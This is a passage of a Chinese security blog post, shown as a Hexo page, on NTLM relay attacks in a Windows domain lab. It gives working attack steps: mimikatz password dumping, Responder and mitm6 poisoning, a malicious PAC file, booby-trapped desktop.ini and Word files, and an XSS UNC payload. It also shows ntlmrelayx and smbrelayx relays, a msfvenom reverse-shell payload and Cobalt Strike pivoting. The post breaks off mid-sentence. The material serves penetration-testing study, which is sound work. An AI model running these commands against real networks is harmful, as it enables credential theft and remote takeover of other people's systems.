<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.4.2"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-浅析域内NTLM Relay攻击" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/12/15/%E6%B5%85%E6%9E%90%E5%9F%9F%E5%86%85NTLM%20Relay%E6%94%BB%E5%87%BB/" class="article-date">
  <time datetime="2021-12-15T08:50:00.000Z" itemprop="datePublished">2021-12-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/12/15/%E6%B5%85%E6%9E%90%E5%9F%9F%E5%86%85NTLM%20Relay%E6%94%BB%E5%87%BB/">浅析域内NTLM Relay攻击</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="浅析域内NTLM-Relay攻击"><a href="#浅析域内NTLM-Relay攻击" class="headerlink" title="浅析域内NTLM Relay攻击"></a>浅析域内NTLM Relay攻击</h1><h2 id="域环境下的认证体系"><a href="#域环境下的认证体系" class="headerlink" title="域环境下的认证体系"></a>域环境下的认证体系</h2><p>​    <code>Windows</code>的身份认证方式有两种，一种是<code>NTLM</code>认证方式，即挑战/响应机制；另外一种就是<code>Kerberos</code>认证方式。</p>
<p>​    早期，<code>Windows</code>域环境下使用<code>NTLM</code>作为认证方式，后来采用了<code>Kerberos</code>协议。在默认环境下，<code>NTLM</code>认证和<code>Kerberos</code>认证同时存在于域环境下。当我们指定主机名的时候，会选用<code>Kerberos</code>来作为认证方式：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211122170702159.png" alt="image-20211122170702159"></p>
<p>而当指定主机<code>ip</code>的时候，会采用<code>NTLM</code>认证方式。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211122170811033.png" alt="image-20211122170811033"></p>
<p>​    因此，在<code>Windows</code>域环境下，针对不同的认证机制，也存在不同的攻击手段。</p>
<p>​    这里主要讨论<code>NTLM</code>中继攻击，因此主要介绍一些<code>NTLM</code>认证协议。<code>NTLM</code>身份认证可以分为两种，一种是本地认证，一种是网络认证。</p>
<h3 id="NTLM-本地认证"><a href="#NTLM-本地认证" class="headerlink" title="NTLM`本地认证"></a>NTLM`本地认证</h3><p>​    <code>Windows</code>将用户的密码存储在本地计算机的<code>SAM</code>文件中，文件位置：<code>C:\Windows\System32\config\SAM</code>。密码的存储以<code>NTLM Hash</code>的方式进行存储。当用户输入密码进行本地认证时，首先系统会将明文密码处理成<code>NTLM Hash</code>，然后与<code>SAM</code>文件中的<code>Hash</code>进行比较，相同则认证通过。同时，会在<code>lsass.exe</code>进程中，保存一份明文密码。</p>
<p>​    这里也提到，<code>lsass</code>进程会缓存一份明文密码，当获取到一台主机权限之后，可以利用<code>mimikatz</code>从<code>lsass</code>进程中导出密码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211126102058524.png" alt="image-20211126102058524"></p>
<h3 id="NTLM-网络认证"><a href="#NTLM-网络认证" class="headerlink" title="NTLM`网络认证"></a>NTLM`网络认证</h3><p>​    <code>NTLM</code>的网络认证，仔细细分可以分为工作组环境下的认证和域环境下的认证。大致原理相同，都是采用<code>Challenge/Response</code>验证机制。</p>
<p>​    在工作组环境下，<code>NTLM</code>认证主要分为三步：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211126102144904.png" alt="image-20211126102144904"></p>
<p>​    1）客户端首先会在本地缓存一份用户输入的密码值对应的<code>NTLM Hash</code>，然后向服务端发送<code>Negotiate</code>协商消息，去指定需要协商认证的用户、机器以及其他相关信息。</p>
<p>​    2）服务端接收到<code>Negotiate</code>协商消息之后，会将数据传输给<code>NTLM SSP</code>进行处理，然后获得一个返回的16位随机值，称之为<code>Challenge</code>，将其发送给客户端，并在本地缓存该<code>Challenge</code>。</p>
<p>​    3）客户端提取出来<code>Challenge</code>之后，使用本地缓存的<code>NTLM Hash</code>值对其进行加密，得到的值成为<code>Net-NTLM Hash</code>，然后将该值封装到<code>Authenticate</code>认证消息中传输给服务端。</p>
<p>​    4）服务端收到认证消息之后，会使用自己的密码对应的<code>NTLM Hash</code>值对本地缓存的<code>Challenge</code>进行哈希处理，然后将得到的值与认证消息中的<code>Net-NTLM Hash</code>进行比较，如果匹配则认证通过。</p>
<p>​    在域环境下，<code>NTLM</code>的认证方式与上面基本相同，唯一不同点是第4步，服务端会向域控请求校验。</p>
<p>​    <img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211126102204524.png" alt="image-20211126102204524"></p>
<h2 id="中继攻击原理解析"><a href="#中继攻击原理解析" class="headerlink" title="中继攻击原理解析"></a>中继攻击原理解析</h2><p>​        <code>NTLM Hash</code>值分为三种，分别为<code>NTLMv1</code>、<code>NTLMv2</code>、<code>NTLM session v2</code>，<code>Net-NTLM Hash</code>根据不同的类型的<code>NTLM Hash</code>加密，可以分为<code>Net-NTLM Hash v1</code>和<code>Net-NTLM Hash v2</code>。其中，<code>NTLM v1</code>强度比较低，易于破解，当获取到此<code>Net-NTLM Hash v1</code>值的时候，可以直接进行破解获取到明文。而<code>NTLM v2</code>相对来说密码强度较高，可以进行暴力破解，但是需要比较强大的字典。通常情况下，<code>NTLM Hash</code>的值都是<code>NTLM v2</code>，因此想要直接获取到明文，相对来说比较困难。因此，可以采用另外一种攻击方式，即<code>NTLM Relay</code>攻击。</p>
<p>​        <code>NTLM Relay</code>攻击其实就是攻击者转发客户端的所有请求给服务端，从而完成认证。这是一种中间人攻击的方式，其实也就是对获取到的<code>Net-NTLM Hash</code>进行重放。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211126103516823.png" alt="image-20211126103516823"></p>
<p>​    攻击的关键是如何中间截获数据包，获取到<code>Net-NTLM Hash</code>值。下面介绍一些常见的捕获<code>Net-NTLM Hash</code>方法。</p>
<h3 id="利用LLMNR和NetBIOS欺骗"><a href="#利用LLMNR和NetBIOS欺骗" class="headerlink" title="利用LLMNR和NetBIOS欺骗"></a>利用<code>LLMNR</code>和<code>NetBIOS</code>欺骗</h3><p>​    <code>LLMNR</code>全称链路本地多播名称解析，是基于域名系统（<code>DNS</code>）数据包格式的协议，<code>IPv4</code>和<code>IPv6</code>的主机可以通过此协议对同一本地链路上的主机执行名称解析。简单理解为就是一种在局域网内寻找主机的协议。</p>
<p>​    <code>NetBios</code>全称网络基本输入输出系统，它提供了<code>OSI</code>模型中的会话层服务，让在不同计算机上运行的不同程序，可以在局域网中，互相连线，以及分享数据。<code>NetBIOS</code>也是计算机的标识名称，主要用于局域网内计算机的互访。<code>NetBIOS</code>的工作流程就是正常的机器名解析查询应答过程。在<code>Windows</code>操作系统中，默认情况下在安装<code> TCP/IP</code> 协议后会自动安装<code>NetBIOS</code>。</p>
<p>​    <code>Windows</code>解析主机名的顺序为：</p>
<p>​    1）查看本地<code>hosts</code>文件</p>
<p>​    2）查看<code>DNS</code>缓存或者<code>DNS</code>服务器中进行查找</p>
<p>​    3）利用<code>LLMNR</code>（链路本地多播名称解析）和<code>NetBIOS</code>名称服务进行查找</p>
<p>​    在局域网环境下，当用户输入了一个不存在的，或者错误的，<code>DNS</code>中不存在的主机名的时候，<code>Windows</code>系统根据主机名解析的顺序开始查找，最终在局域网内广播<code>LLMNR/NBNS</code>数据包来请求解析主机名。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211122215648315.png" alt="image-20211122215648315"></p>
<p>​    而此时，如果我们以及拥有了一台局域网主机的权限，我们就可以假装成受害者想要访问的主机，从而让受害者交出凭证。</p>
<p>​    例如，使用<code>Responder</code>工具在局域网下开启监听，等待局域网内广播的数据包。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0 -f -v</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211122221956730.png" alt="image-20211122221956730"></p>
<p>​    然后我在域控主机上利用<code>SMB</code>协议随便访问一个不存在主机：<code>dir \\m1sn0w\c$</code>，之后监听主机就可以接收到返回来的<code>Net-NTLM Hash</code>值：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211122222202985.png" alt="image-20211122222202985"></p>
<p>​    抓取流量包，可以看见，首先进行了广播，然后监听的攻击机（10.10.10.24）响应域控，告诉自己是<code>m1sn0w</code>主机。之后两台机器进行了<code>NTLM</code>认证，域控主机向攻击机发送了<code>Net-NTLM Hash</code>：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211122222659285.png" alt="image-20211122222659285"></p>
<h3 id="利用WPAD劫持"><a href="#利用WPAD劫持" class="headerlink" title="利用WPAD劫持"></a>利用<code>WPAD</code>劫持</h3><p>​    <code>WPAD</code>全称为网络代理自动发现协议，它是客户端使用<code>DHCP</code>、<code>DNS</code>、<code>LLMNR</code>、<code>NBNS</code>协议来定位一个代理自动配置文件<code>URL</code>的方法。</p>
<p>​    代理自动配置文件（<code>PAC</code>），定义了浏览器或者其他代理如何选择适当的代理服务器来访问其要访问的<code>URL</code>。</p>
<p>​    也就是说，通过劫持<code>WPAD</code>，返回一个恶意构造好的<code>PAC</code>文件。然后客户端就会从这个<code>PAC</code>文件中去选择合适的代理服务器。由于远程<code>PAC</code>文件可以指定为攻击者自己的<code>V-P-S</code>服务器上的一个伪造文件，因此客户端的代理服务器也就被攻击者控制了。</p>
<p>​    <code>PAC</code>代理自动配置文件的格式如下，文件名为<code>wpad.dat</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function FindProxyForURL(url, host) &#123;</span><br><span class="line"> if (url== &#x27;http://www.baidu.com/&#x27;) return &#x27;DIRECT&#x27;;</span><br><span class="line"> if (host== &#x27;twitter.com&#x27;) return &#x27;SOCKS 127.0.0.10:7070&#x27;;</span><br><span class="line"> if (dnsResolve(host) == &#x27;10.0.0.100&#x27;) return &#x27;PROXY 127.0.0.1:8086;DIRECT&#x27;;</span><br><span class="line"> return &#x27;DIRECT&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    劫持<code>WPAD</code>一般有两种方式，一种是利用<code>LLMNR/NBNS</code>投毒，另外一种是利用<code>ipv6</code>协议，使用<code>DHCPv6</code>进行劫持。</p>
<h4 id="LLMNR-NBNS投毒"><a href="#LLMNR-NBNS投毒" class="headerlink" title="LLMNR/NBNS投毒"></a><code>LLMNR/NBNS</code>投毒</h4><p>​    当浏览器设置了代理为<code>自动检测设置</code>后，用户访问一个<code>URL</code>的时候，主机就会向<code>WPAD/wpad.dat</code>发送查询请求。如果在域环境中，没有对<code>WPAD</code>主机进行配置，本地<code>hosts</code>文件和<code>DNS</code>服务器解析不到这个域名的话，就会通过<code>LLMNR</code>广播的方式，向局域网内的服务器询问该主机对应<code>ip</code>。</p>
<p>​    此时如果攻击者在局域网内，就可以伪造声称自己是<code>WPAD</code>主机，并返回给受害者<code>PAC</code>文件，其中的代理服务器可以指向攻击者自身。客户机收到<code>PAC</code>文件之后，所有的<code>HTTP</code>流量都会经过代理服务器，也就是攻击者的服务器，这也就达到了劫持流量的目的，开启了中间人攻击。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123105444830.png" alt="image-20211123105444830"></p>
<p>​    <code>IE</code>浏览器默认配置为<code>自动检测代理</code>，当攻击机在局域网内监听流量之后，客户端打开<code>IE</code>浏览器并随机访问一个网页时，攻击者就可以伪造成<code>WPAD</code>，向其返回一个<code>PAC</code>文件，并将代理指向自己。</p>
<p>​        <img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211126104403589.png" alt="image-20211126104403589"></p>
<h4 id="DHCPv6"><a href="#DHCPv6" class="headerlink" title="DHCPv6"></a><code>DHCPv6</code></h4><p>​    微软在2016年发布了<code>MS16-077</code>的补丁，添加了两个保护措施：</p>
<p>​    1、禁止系统通过广播协议来解析<code>WPAD</code>文件的位置，只能通过使用<code>DHCP</code>或者<code>DNS</code>协议来确定位置。</p>
<p>​    2、更改了<code>PAC</code>文件下载的默认行为，当通过<code>WinHTTP</code>请求<code>PAC</code>文件的时候，不会自动发送客户端的凭据来响应请求。</p>
<p>​    因此，为了绕过第一个限制，就可以采用<code>DHCP v6</code>的方式。</p>
<p>​    <code>DHCP V6</code>的交互方式：</p>
<p>​    1、客户端向组播地址发送<code>Solicit</code>请求报文</p>
<p>​    2、组播地址包括的整个地址链路范围内的<code>DHCP</code>服务器和中继代理回应一个<code>Advertise</code>消息给客户端。</p>
<p>​    3、客户端会选择优先级最高的服务器发送<code>Request</code>请求。</p>
<p>​    4、相应服务器回复确认地址、委托前缀、配置等信息。</p>
<p>​    也就是说，在<code>IPv6</code>的情况下，攻击者接收到其他机器的<code>DHCP v6</code>组播包之后，可以让受害者的<code>DNS</code>服务器设置成攻击者<code>IPv6</code>地址。这样在进行<code>WPAD</code>查询的时候，就会像攻击者的主机发送请求。</p>
<p>​       利用<code>mitm6</code>工具，该工具自动检测攻击者计算机的<code>IP</code>配置，并以包含攻击者<code>IP</code>作为<code>DNS</code>服务器的<code>DHCPv6</code>应答回复网络中客户端发送的<code>DHCPv6</code>请求进行<code>DNS</code>欺骗，成功之后将目标主机的默认网关将设置成攻击机的<code>IPv6</code>地址。</p>
<p>​    工具下载地址：<a target="_blank" rel="noopener" href="https://github.com/dirkjanm/mitm6">https://github.com/dirkjanm/mitm6</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 mitm6.py -d de1ay.com -i eth0</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125233507946.png" alt="image-20211125233507946"></p>
<p>​    </p>
<p>​    第二个限制的绕过方式相对来说就比较简单，只需要在进行<code>HTTP</code>认证的时候，强制用户输入验证信息，即可。在使用<code>Responder</code>工具的时候，使用<code>-F</code>选项。</p>
<h3 id="利用desktop-ini"><a href="#利用desktop-ini" class="headerlink" title="利用desktop.ini"></a>利用<code>desktop.ini</code></h3><p>​    每一个文件夹都含有一个隐藏文件<code>desktop.ini</code>，该文件的作用主要是用来定义文件夹图标之类的信息。在文件夹属性处，去掉相应选项就可以看见每个文件夹下面存在<code>desktop.ini</code>文件。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123130546953.png" alt="image-20211123130546953"></p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123125630342.png" alt="image-20211123125630342"></p>
<p>​    将这里的值设置为<code>UNC</code>路径，当其他用户访问此目录的时候，就会向指定的<code>UNC</code>请求图标资源。配合上面的<code>LLMNR/NBNS</code>投毒，即可获取到<code>Net-NTLM Hash</code>。</p>
<p>​    例如，这里我创建一个<code>m1sn0w</code>文件夹，然后将路径修改成<code>\\m1sn0w\c$</code>。利用<code>responder</code>在局域网内开启监听，当我再次打开<code>m1sn0w</code>文件夹的时候，攻击机就可以捕获到<code>Net-NTLM Hash</code>。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123130847099.png" alt="image-20211123130847099"></p>
<h3 id="利用office文件钓鱼"><a href="#利用office文件钓鱼" class="headerlink" title="利用office文件钓鱼"></a>利用<code>office</code>文件钓鱼</h3><p>​    该利用方式也是利用<code>UNC</code>路径，当用户打开<code>Word</code>文档之后，就会自动向指定的<code>UNC</code>发送请求。制作方式：</p>
<p>​    创建一个<code>word</code>文档，然后添加一张图片进去：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123131804865.png" alt="image-20211123131804865"></p>
<p>​    保存之后将文件后缀更改成<code>zip</code>，然后解压缩。在<code>word\_rels\document.xml.rels</code>中找到图片的位置，然后修改成<code>UNC</code>路径：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123131941484.png" alt="image-20211123131941484"></p>
<p>​    修改属性值为<code>Target=&quot;\\m1sn0w\c$&quot; TargetMode=&quot;External&quot;</code>，然后压缩之后修改后缀为<code>docx</code>。当用户打开该<code>word</code>文档之后，便会向局域网内发送广播数据包，攻击者就可以获取到<code>Net-NTLM Hash</code>：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211124174042882.png" alt="image-20211124174042882"></p>
<p>​    查看流量数据，可发现广播了数据包去询问主机<code>m1sn0w</code>:</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211124174007744.png" alt="image-20211124174007744"></p>
<h3 id="利用Web漏洞或者数据库"><a href="#利用Web漏洞或者数据库" class="headerlink" title="利用Web漏洞或者数据库"></a>利用<code>Web</code>漏洞或者数据库</h3><p>​    例如<code>XSS</code>漏洞，设置一个<code>UNC</code>路径，当客户端运行加载的时候，就会在局域网内进行广播：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;\\m1sn0w\c$&quot; &gt;</span><br></pre></td></tr></table></figure>

<h2 id="攻击面扩展"><a href="#攻击面扩展" class="headerlink" title="攻击面扩展"></a>攻击面扩展</h2><p>​    当获取到<code>Net-NTLM Hash</code>之后，接下来需要做的就是如何利用该哈希。<code>NTLM</code>是一种底层的认证协议，通常会将获取的<code>Net-NTLM Hash</code>配合上层协议进行攻击。针对<code>Net-NTLM Hash</code>的攻击方式有两种，一种就是直接对其进行暴力破解，另外一种就是通过重放的方式，<code>Relay</code>到其他机器上。（只要是支持<code>NTLM SSP</code>的协议，都可以中继过去）一种比较常见的方式就是中继到<code>SMB</code>服务器上。（还可以中继到其他的服务，例如<code>EWS</code>、<code>LDAP</code>等）</p>
<p>​    如果能直接<code>Relay</code>到<code>SMB</code>服务器，就相当于可以直接控制目标服务器，可以在目标服务器上远程命令执行，文件上传，下载文件等操作。在域环境中，只有域控主机默认开启<code>SMB</code>签名，这是一种服务器与客户端协商以使用继承的会话密钥对所有传入的数据包进行数字签名的配置。</p>
<h3 id="利用MultiRelay-py进行攻击"><a href="#利用MultiRelay-py进行攻击" class="headerlink" title="利用MultiRelay.py进行攻击"></a>利用<code>MultiRelay.py</code>进行攻击</h3><p>​    因此，在进行<code>Relay</code>攻击之前，可以通过<code>responder</code>工具包下的<code>RunFinger.py</code>脚本对域内主机的开放情况做一个探测：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 RunFinger.py -i 10.10.10.1/24 </span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123143004804.png" alt="image-20211123143004804"></p>
<p>​    可以看见只有域控主机开启了<code>SMB</code>签名，因此，接下来尝试通过捕获到域管的<code>Net-NTLM Hash</code>，然后中继到其他两台机器上进行命令执行。</p>
<p>​    利用<code>responder</code>工具包下的<code>MultiRelay.py</code>脚本进行攻击，如果<code>Relay</code>成功，可以直接获取到目标主机的<code>Shell</code>。这里我尝试<code>Relay</code>到<code>Win2008</code>上面，即<code>10.10.10.18</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 MultiRelay.py -t 10.10.10.18 -u ALL</span><br></pre></td></tr></table></figure>

<p>​    然后在局域网内开启<code>responder</code>，此时要修改一下配置，不让<code>responder</code>抓取<code>Net-NTLM Hash</code>，而由<code>MultiRelay</code>进行中继，关闭<code>SMB</code>和<code>HTTP</code>即可。（配置文件路径：<code>/usr/share/responder/Responder.conf</code>）</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123152236668.png" alt="image-20211123152236668"></p>
<p>​    之后我在域控上随机发送<code>SMB</code>流量，待攻击机监听后，转由<code>MultiRelay</code>进行中继，即可获取到目标主机的<code>Shell</code>。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123152518787.png" alt="image-20211123152518787"></p>
<h3 id="利用smbrelayx-py进行攻击"><a href="#利用smbrelayx-py进行攻击" class="headerlink" title="利用smbrelayx.py进行攻击"></a>利用<code>smbrelayx.py</code>进行攻击</h3><p>​    该工具的原理就是在本地临时搭建一个<code>SMB</code>服务，当域内主机访问该主机时，就会截获<code>Net-NTLM Hash</code>，并中继到其他机器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbrelayx.py -h target_ip -c command</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125095946249.png" alt="image-20211125095946249"></p>
<h3 id="利用ntlmrelayx-py进行攻击"><a href="#利用ntlmrelayx-py进行攻击" class="headerlink" title="利用ntlmrelayx.py进行攻击"></a>利用<code>ntlmrelayx.py</code>进行攻击</h3><p>​    工具下载地址：<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlmrelayx.py -t smb://10.10.10.18 -c whoami -smb2support</span><br></pre></td></tr></table></figure>

<p>​    然后利用<code>responder</code>开启局域网内的监听，待域控主机发送广播数据报之后，攻击机响应数据报，截获域管的<code>Net-NTLM Hash</code>之后，中继到<code>10.10.10.18</code>，与之进行通信。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123162044505.png" alt="image-20211123162044505"></p>
<h2 id="实网对抗下的中继打法"><a href="#实网对抗下的中继打法" class="headerlink" title="实网对抗下的中继打法"></a>实网对抗下的中继打法</h2><h3 id="被动攻击方式"><a href="#被动攻击方式" class="headerlink" title="被动攻击方式"></a>被动攻击方式</h3><p>​    前面在中继攻击<code>SMB</code>的时候用到的<code>smbrelayx.py</code>脚本，它用于在本地临时搭建一个<code>SMB</code>服务，当域内其他用户访问这个服务的时候，就可以捕获<code>Net-NTLM Hash</code>，从而中继到其他机器上面。</p>
<p>​    但是在实际场景下，这种方法要实现起来比较困难。首先当前机器的445端口要没有被占用，一般在<code>Windows</code>操作系统下，445端口都是被占用的。其次就是需要目标机器存在<code>Python</code>环境。因此，如果在内网环境下，目标机器是<code>Linux</code>的话，可以考虑利用此方式。</p>
<p>​    实验拓扑环境如下：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125101135803.png" alt="image-20211125101135803"></p>
<p>​    我在主机<code>10.10.10.24</code>上通过<code>smbrelayx.py</code>临时搭建一个<code>SMB</code>服务，然后将捕获的<code>Net-NTLM Hash</code>中继到受害者机器<code>10.10.10.18</code>上面：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbrelayx.py -h 10.10.10.18 -c whoami</span><br></pre></td></tr></table></figure>

<p>​    当域内主机访问<code>10.10.10.24</code>的<code>SMB</code>，就会与其进行<code>NTLM</code>认证，然后捕获到<code>Net-NTLM Hash</code>之后，中继到其他机器：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125100540635.png" alt="image-20211125100540635"></p>
<p>​    也可以和其他工具联动，例如可以通过<code>msfvenom</code>生成一个<code>shell.exe</code>，然后放置到攻击机上面。当中继攻击成功以后，可以让他下载本地的<code>shell.exe</code>并运行，这样，在<code>msf</code>中开启监听后，就可以获取到目标的<code>shell</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 生成shell.exe</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.24 LPORT=8899 -f exe -o shell.exe</span><br></pre></td></tr></table></figure>

<p>​    然后使用<code>exploit/multi/handler</code>，配置<code>AutoRunScript</code>，当获取到<code>shell</code>让他进程自动迁移，避免<code>shell</code>文件被删除时连接的<code>shell</code>断开：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set AutoRunScript post/windows/manage/migrate</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125102540282.png" alt="image-20211125102540282"></p>
<p>​    然后临时搭建<code>SMB</code>服务，利用<code>smbrelayx.py</code>的<code>-e</code>参数指定下载运行的文件路径，让获取到<code>Net-NTLM Hash</code>之后，<code>msf</code>就会收到反弹获取的<code>shell</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbrelayx.py -h 10.10.10.18 -e ../../shell.exe</span><br></pre></td></tr></table></figure>

<h3 id="主动攻击方式"><a href="#主动攻击方式" class="headerlink" title="主动攻击方式"></a>主动攻击方式</h3><h4 id="PortBender流量重定向"><a href="#PortBender流量重定向" class="headerlink" title="PortBender流量重定向"></a><code>PortBender</code>流量重定向</h4><p>​    在实际的网络拓扑环境下，一般都是通过团队服务器向目标主机上传一个<code>beacon</code>后获取权限。此时进行中继攻击就会存在几个问题，比如：目标445端口已经被占用，所以不能直接嗅探该端口传入的流量。又或者目标<code>Windows</code>主机上没有一些语言环境，操作不方便。</p>
<p>​    最简单的一种实网拓扑结构：图来自<code>https://rastamouse.me/ntlm-relaying-via-cobalt-strike/</code></p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211124175507506.png" alt="image-20211124175507506"></p>
<p>​    <code>TeamServer</code>位于互联网。当目标主机通过<code>beacon</code>控制之后，如果要利用<code>NTLM Relay</code>攻击中继到内网的其他机器，最简单的做法就像上面那样，开启监听之后<code>Relay</code>到其他机器，但这里存在的一个问题是，如果目标机器的445端口占用了，也就是说不能直接监听到445的流量，同时，内网环境下，目标通常是<code>Windows</code>操作系统，如果没有装<code>Python</code>，那么有一些工具就不能运行。</p>
<p>​    因此，在对抗过程中，可以使用端口流量的重定向，以及流量转发，代理来实现攻击机通过<code>TeamServer</code>攻击内网。</p>
<p>​    <code>PortBender</code>工具可以用于端口流量的重定向，工具地址：<code>https://github.com/praetorian-inc/PortBender</code>，将<code>PortBender.cna</code>导入到<code>Cobalt Strike</code>中。</p>
<p>​    当获取一个<code>SYSTEM</code>权限的<code>beacon</code>之后，通过<code>upload</code>命令将<code>WinDivert64.sys</code>或者<code>WinDivert32.sys</code>上传到目标主机（根据目标主机的类型），然后执行:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PortBender redirect 445 8445</span><br></pre></td></tr></table></figure>

<p>​    此时会将445端口的流量重定向到8445端口，接下来配置<code>rportfwd</code>。</p>
<p>​    <code>Cobalt Strike</code>工具自带的<code>rportfwd</code>，用于远程端口转发，即将目标机器的某个端口流量全部转发到远端指定的一个端口，命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rportfwd 8445 10.10.20.25 445</span><br></pre></td></tr></table></figure>

<p>​    表示将此台（受控端）主机8445端口的流量转发到攻击机（10.10.20.25）的445端口上。也就是说445端口的流量此时通过重定向，发送给了8445端口，由于远程端口转发，本地8445端口流量全部转发到远程主机的445端口上。</p>
<p>​    此时设置一个代理，通过代理运行<code>nltmrelayx.py</code>进行中继攻击的监听：</p>
